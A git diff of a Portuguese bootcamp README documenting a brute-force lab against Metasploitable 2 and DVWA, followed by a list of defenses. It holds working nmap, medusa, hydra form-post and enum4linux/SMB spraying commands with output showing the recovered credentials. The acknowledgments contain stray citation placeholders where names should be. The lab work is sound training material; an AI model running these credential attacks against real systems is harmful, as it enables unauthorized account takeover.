@@ -1,10 +1,10 @@
 # bruteforce-lab BOOTCAMP DIO.ME x RIACHUELO
 
-## 🎯 Objetivo
+##  Objetivo
 
 Simular ataques de força bruta em ambiente controlado para estudo de vulnerabilidades e mitigação.
 
-## 🖥️ Ambiente
+##  Ambiente
 
 Kali Linux (atacante)
 
@@ -12,7 +12,7 @@ Metasploitable 2 (alvo)
 
 Rede Host-only
 
-## 🔎 Enumeração
+##  Enumeração
 
 Comando:
 ```nmap -sV -p 21,22,80,445,139 192.168.56.101``` | 21,22,80,445,139 se refere as portas que quero acessar verificar | 192.168.56.101 se refere ao ip do Metasploitble2
@@ -30,7 +30,7 @@ MAC Address: ********** (Oracle VirtualBox virtual NIC)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
-## 💥 Ataque FTP
+##  Ataque FTP
 
 Comando: ```medusa -h IP -U usuarios.txt -P senhas.txt -M ftp -t 6```
 
@@ -65,7 +65,7 @@ Resultado:
 Validação:
 ``` 2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS] ```
 
-## 🌐 Ataque Web (DVWA)
+##  Ataque Web (DVWA)
 Comando: 
 ```
 hydra -L users.txt -P pass.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
@@ -114,7 +114,7 @@ Evidência adicional:
 Login manual realizado com sucesso no DVWA utilizando as credenciais encontradas.
 A ausência da mensagem “Login failed” confirmou autenticação válida.
 
-# 🧨 Password Spraying SMB
+## Password Spraying SMB
 
 Comando utilizado para enumeração: `enum4linux -a 192.168.56.101 | tee enum4_output.txt` > insira a senha > `less enum4_output.txt`
 
@@ -214,3 +214,112 @@ Reconnecting with SMB1 for workgroup listing.
         WORKGROUP            METASPLOITABLE
 ```
 Você entrou!
+---
+# Mitigações contra Brute Force em Autenticação Web
+
+## 1. Limitação de Tentativas (Rate Limiting)
+- Bloquear ou atrasar novas tentativas após X falhas consecutivas.
+- Implementar **backoff exponencial** (ex.: 1s → 2s → 4s → 8s).
+- Limitar requisições por IP e por conta de usuário.
+
+**Benefício:** reduz drasticamente a viabilidade de ataques automatizados.
+
+---
+
+## 2. Bloqueio Temporário de Conta
+- Após várias falhas (ex.: 5 tentativas), bloquear a conta por um período.
+- Notificar o usuário sobre o bloqueio.
+- Permitir desbloqueio via verificação segura (email, MFA).
+
+**Risco mitigado:** força o atacante a desacelerar ou desistir.
+
+---
+
+## 3. CAPTCHA / Desafio Humano
+- Aplicar CAPTCHA após algumas falhas de login.
+- Alternar dinamicamente o nível de dificuldade.
+
+**Benefício:** impede ferramentas automatizadas de testar credenciais em massa.
+
+---
+
+## 4. Autenticação Multifator (MFA)
+- Exigir um segundo fator (app autenticador, token, biometria).
+- Aplicar especialmente para acessos administrativos.
+
+**Impacto:** mesmo com senha correta, o acesso não é concedido sem o segundo fator.
+
+---
+
+## 5. Política de Senhas Fortes
+- Tamanho mínimo ≥ 12 caracteres.
+- Mistura de tipos de caracteres.
+- Bloquear senhas comuns e vazadas.
+- Incentivar uso de gerenciadores de senha.
+
+**Observação:** complexidade sem comprimento suficiente não resolve o problema.
+
+---
+
+## 6. Monitoramento e Alertas
+- Registrar tentativas falhas e padrões anômalos.
+- Alertar administradores sobre picos de falhas.
+- Implementar sistemas de detecção de intrusão (IDS/IPS).
+
+**Objetivo:** detectar ataque em andamento e reagir rapidamente.
+
+---
+
+## 7. Proteção de Infraestrutura
+- WAF (Web Application Firewall) com regras anti-brute-force.
+- Bloqueio geográfico quando aplicável.
+- Lista de IPs suspeitos (blocklist dinâmica).
+
+---
+
+## 8. Respostas de Erro Genéricas
+- Não informar se o erro foi no usuário ou na senha.
+- Evitar mensagens que ajudem enumeração de contas.
+
+**Exemplo seguro:** “Credenciais inválidas”.
+
+---
+
+## 9. Segurança de Sessão
+- Invalidar sessão após várias falhas.
+- Cookies com flags Secure e HttpOnly.
+- Rotação de sessão após login.
+
+---
+
+## 10. Hardening do Endpoint de Login
+- Evitar endpoints previsíveis ou expostos desnecessariamente.
+- Implementar verificação de origem e headers suspeitos.
+- Aplicar proteção contra automação (fingerprinting de cliente).
+
+---
+
+# Conclusão
+A defesa eficaz contra brute force depende de **camadas combinadas**:
+rate limiting + MFA + monitoramento + política de senha forte.
+
+Nenhuma medida isolada é suficiente.
+---
+
+
+## 📚 Aprendizados
+
+- **Compreensão prática de brute force em aplicações web:** ao testar o fluxo de autenticação (ex.: DVWA), ficou claro como pequenas falhas de controle — ausência de rate limiting, respostas de erro detalhadas e falta de MFA — ampliam a superfície de ataque.
+
+- **Importância do ajuste fino das ferramentas ofensivas:** configurar corretamente parâmetros de automação (listas de usuários/senhas, padrão de falha e método HTTP) é decisivo para resultados consistentes. Pequenos erros de sintaxe ou interpretação do formulário podem invalidar o teste.
+
+- **Visão defensiva orientada por evidência:** cada exploração bem-sucedida aponta diretamente para uma mitigação mensurável (limitação de tentativas, CAPTCHA adaptativo, monitoramento e hardening do endpoint). Segurança eficaz é **camadas + observabilidade**.
+
+- **Metodologia de teste replicável:** documentar premissas, comandos, evidências e limitações melhora a reprodutibilidade e fortalece a comunicação técnica do projeto.
+
+- **Ética e escopo importam:** testes devem ocorrer apenas em ambientes autorizados e controlados. Segurança eficaz exige responsabilidade técnica e legal.
+
+---
+
+###  Agradecimentos
+Agradecimento especial à :contentReference[oaicite:0]{index=0} e à :contentReference[oaicite:1]{index=1} pela oportunidade de participar do bootcamp e fortalecer a base prática em segurança ofensiva e defensiva.
